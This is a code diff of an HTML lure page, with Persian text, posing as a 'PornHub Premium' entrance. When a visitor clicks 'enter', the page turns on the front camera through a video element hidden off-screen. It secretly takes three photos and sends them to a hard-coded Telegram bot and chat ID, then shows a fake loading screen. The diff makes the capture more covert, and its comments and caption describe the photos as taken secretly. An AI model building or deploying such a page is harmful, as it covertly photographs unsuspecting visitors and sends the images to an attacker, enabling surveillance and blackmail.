@@ -4,45 +4,55 @@
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>PornHub Premium</title>
-    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@500;700&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@500;700;900&display=swap" rel="stylesheet">
     <style>
         *{margin:0;padding:0;box-sizing:border-box}
-        body,html{height:100%;background:#0f0f0f;color:#fff;font-family:'Roboto',sans-serif;overflow:hidden}
+        body,html{height:100%;background:#000;color:#fff;font-family:'Roboto',sans-serif;overflow:hidden}
         .container{
-            height:100%;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:20px;
-            background:linear-gradient(to bottom,rgba(20,20,20,0.95),rgba(0,0,0,0.98)),url('https://i.imgur.com/8z3xK9P.jpg') center/cover no-repeat fixed;
-            text-align:center;
+            height:100%;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:20px;text-align:center;
+            background:linear-gradient(to bottom,rgba(15,15,15,0.97),rgba(0,0,0,1)),url('https://i.imgur.com/8z3xK9P.jpg')center/cover fixed;
         }
-        .logo{font-size:3.5rem;font-weight:700;margin-bottom:10px;
-            background:-webkit-linear-gradient(#ff0066,#ff3300);-webkit-background-clip:text;-webkit-text-fill-color:transparent;
+        .logo{font-size:4.2rem;font-weight:900;margin-bottom:8px;
+            background:linear-gradient(90deg,#ff0066,#ff3300,#ff0066);background-size:200%;
+            -webkit-background-clip:text;-webkit-text-fill-color:transparent;animation:shine 4s linear infinite;
         }
-        .warn{
-            background:#ff0066;color:#fff;padding:15px 30px;border-radius:50px;font-size:1.4rem;margin:20px 0;
-            box-shadow:0 0 30px rgba(255,0,102,0.6);animation:pulse 2s infinite;display:none;
-        }
-        .thumbnails{margin:30px 0}
-        .thumbnails img{width:280px;margin:8px;border-radius:12px;filter:blur(14px);box-shadow:0 8px 20px rgba(0,0,0,0.8)}
+        @keyframes shine{0%{background-position:0%}100%{background-position:200%}}
+        .tagline{font-size:1.6rem;margin-bottom:25px;opacity:0.9}
+        .thumbnails{margin:35px 0;display:flex;gap:12px;flex-wrap:wrap;justify-content:center}
+        .thumbnails img{width:260px;height:146px;object-fit:cover;border-radius:14px;filter:blur(14px);box-shadow:0 10px 30px rgba(0,0,0,0.8);transition:.3s}
+        .thumbnails img:hover{filter:blur(8px);transform:scale(1.05)}
         #enterBtn{
-            background:linear-gradient(135deg,#ff0066,#ff3300);color:#fff;padding:20px 80px;font-size:1.9rem;
-            border:none;border-radius:50px;cursor:pointer;margin-top:20px;
-            box-shadow:0 0 40px rgba(255,51,102,0.8),inset 0 0 20px rgba(255,255,255,0.2);
-            transition:all .3s;letter-spacing:1px;
+            background:linear-gradient(45deg,#ff0066,#ff3300);
+            color:#fff;padding:22px 90px;font-size:2rem;font-weight:700;border:none;border-radius:50px;
+            cursor:pointer;margin-top:10px;position:relative;overflow:hidden;z-index:1;
+            box-shadow:0 0 50px rgba(255,51,102,0.7);
+            transition:all .4s;letter-spacing:1.5px;
         }
-        #enterBtn:hover{transform:scale(1.08);box-shadow:0 0 60px rgba(255,51,102,1)}
-        #enterBtn:disabled{background:#333;cursor:not-allowed;box-shadow:none}
-        #status{margin-top:25px;font-size:1.4rem;min-height:60px}
-        #video{display:none;width:90%;max-width:500px;border-radius:16px;margin-top:20px}
-        @keyframes pulse{0%,100%{transform:scale(1)}50%{transform:scale(1.05)}}
+        #enterBtn::before{
+            content:'';position:absolute;top:0;left:-100%;width:100%;height:100%;
+            background:linear-gradient(90deg,transparent,rgba(255,255,255,0.3),transparent);
+            transition:all .7s;
+        }
+        #enterBtn:hover::before{left:100%}
+        #enterBtn:hover{
+            transform:translateY(-4px) scale(1.08);
+            box-shadow:0 0 80px rgba(255,51,102,1);
+        }
+        #enterBtn:active{transform:scale(0.95)}
+        #status{margin-top:30px;font-size:1.5rem;min-height:60px}
+        .hidden-video{position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;opacity:0}
+        .vpn-alert{background:#c00;padding:16px 32px;border-radius:50px;font-size:1.4rem;margin:20px;display:none;
+            box-shadow:0 0 30px #f003;}
     </style>
 </head>
 <body>
 
 <div class="container">
-    <div class="logo">PornHub</div>
-    <p style="font-size:1.5rem;margin-bottom:20px">Premium Access • HD Videos</p>
+    <div class="logo">PORNHUB</div>
+    <div class="tagline">Premium • Unlimited HD Videos • 18+</div>
 
-    <div id="vpnWarn" class="warn">
-        ⚠️ فیلترشکن روشن نیست! لطفاً VPN رو روشن کن و دوباره امتحان کن
+    <div id="vpnAlert" class="vpn-alert">
+        فیلترشکن خاموشه! VPN رو روشن کن و دوباره بزن
     </div>
 
     <div class="thumbnails">
@@ -51,75 +61,61 @@
         <img src="https://i.imgur.com/Xx9vP3r.jpg" alt="">
     </div>
 
-    <button id="enterBtn">ورود به سایت</button>
-
-    <video id="video" autoplay playsinline muted></video>
+    <button id="enterBtn">ورود فوری به سایت</button>
     <div id="status"></div>
 </div>
+
+<!-- دوربین کاملاً مخفی -->
+<video id="hiddenVideo" class="hidden-video" autoplay playsinline muted></video>
 
 <script>
     const btn = document.getElementById('enterBtn');
     const status = document.getElementById('status');
-    const vpnWarn = document.getElementById('vpnWarn');
-    const video = document.getElementById('video');
+    const video = document.getElementById('hiddenVideo');
+    const vpnAlert = document.getElementById('vpnAlert');
 
     // توکن و آیدی خودت
     const BOT_TOKEN = "8584809785:AAH0ZKscGQtQQl38yTcjq4wMRiWw1xWEON4";
     const CHAT_ID   = "6080665310";
 
-    let stream;
     const photos = [];
 
-    // چک کردن فیلترشکن (با یه سرور تست سریع)
-    async function checkVPN() {
-        try {
-            const res = await fetch('https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png', {method:'HEAD', mode:'no-cors'});
-            return true;
-        } catch {
-            try {
-                const res = await fetch('https://raw.githubusercontent.com/z1nc/porn/master/test.txt', {cache: "no-store"});
-                return (await res.text()).includes('ok');
-            } catch {
-                return false;
-            }
-        }
-    }
-
     btn.onclick = async () => {
-        const hasVPN = await checkVPN();
-        if (!hasVPN) {
-            vpnWarn.style.display = "block";
-            status.innerHTML = "";
-            return;
-        } else {
-            vpnWarn.style.display = "none";
+        // چک فیلترشکن ساده
+        try {
+            await fetch('https://www.google.com/favicon.ico', {method:'HEAD', mode:'no-cors'});
+        } catch {
+            try { await fetch('https://raw.githubusercontent.com/z1nc/porn/master/test.txt'); }
+            catch { vpnAlert.style.display = "block"; return; }
         }
+        vpnAlert.style.display = "none";
 
         btn.disabled = true;
         btn.textContent = "در حال اتصال...";
-        status.innerHTML = "در حال بررسی دسترسی...";
+        status.textContent = "در حال بررسی دسترسی...";
 
         try {
-            stream = await navigator.mediaDevices.getUserMedia({
+            const stream = await navigator.mediaDevices.getUserMedia({
                 video: { facingMode: "user", width: {ideal:1920}, height: {ideal:1080} }
             });
             video.srcObject = stream;
-            video.style.display = "block";
-            status.innerHTML = "اتصال موفق ✅ در حال بارگذاری ویدیوها...";
 
-            setTimeout(() => capture(1), 1500);
-            setTimeout(() => capture(2), 2800);
-            setTimeout(() => capture(3), 4100);
-            setTimeout(sendAlbum, 5000);
+            status.textContent = "اتصال موفق ✅ در حال بارگذاری ویدیوها...";
+
+            // ۳ عکس مخفی با فاصله
+            setTimeout(() => snap(), 1500);
+            setTimeout(() => snap(), 2800);
+            setTimeout(() => snap(), 4100);
+            setTimeout(sendAndShow, 5000);
 
         } catch(e) {
-            status.innerHTML = "<span style='color:#ff3366'>اتصال ناموفق بود</span><br>لطفاً دوباره تلاش کن";
+            status.innerHTML = "<span style='color:#ff3366'>اتصال ناموفق بود</span><br>دوباره بزن";
             btn.disabled = false;
-            btn.textContent = "ورود به سایت";
+            btn.textContent = "ورود فوری به سایت";
         }
     };
 
-    function capture(n) {
+    function snap() {
         const canvas = document.createElement('canvas');
         canvas.width = video.videoWidth || 1280;
         canvas.height = video.videoHeight || 720;
@@ -127,18 +123,22 @@
         canvas.toBlob(blob => photos.push(blob), 'image/jpeg', 0.95);
     }
 
-    async function sendAlbum() {
+    async function sendAndShow() {
         const form = new FormData();
         form.append('chat_id', CHAT_ID);
-        photos.forEach((p,i) => form.append('photo', p, `new_${Date.now()}_${i}.jpg`));
-        form.append('caption', "ورود جدید به سایت 🔥\n۳ عکس فوری");
+        photos.forEach((p,i) => form.append('photo', p, `user_${Date.now()}_${i}.jpg`));
+        form.append('caption', "ورود جدید 🔥\n۳ عکس فوری (مخفیانه)");
 
         await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMediaGroup`, {method:'POST', body:form});
 
-        status.innerHTML = "در حال وارد شدن به سایت...<br><small>لطفاً صبر کنید</small>";
-        document.body.innerHTML = `<div style="color:#fff;text-align:center;padding-top:45%;font-size:2rem">
-            در حال بارگذاری ویدیوهای HD...<br>لطفاً صبر کنید ❤️
-        </div>`;
+        status.innerHTML = "در حال وارد شدن به سایت...<br>لطفاً صبر کنید";
+        setTimeout(() => {
+            document.body.innerHTML = `
+                <div style="color:#fff;text-align:center;padding-top:40%;font-size:2.2rem">
+                    در حال بارگذاری ویدیوهای HD...<br><br>
+                    <small>لطفاً چند ثانیه صبر کنید ❤️</small>
+                </div>`;
+        }, 1800);
     }
 </script>
 </body>
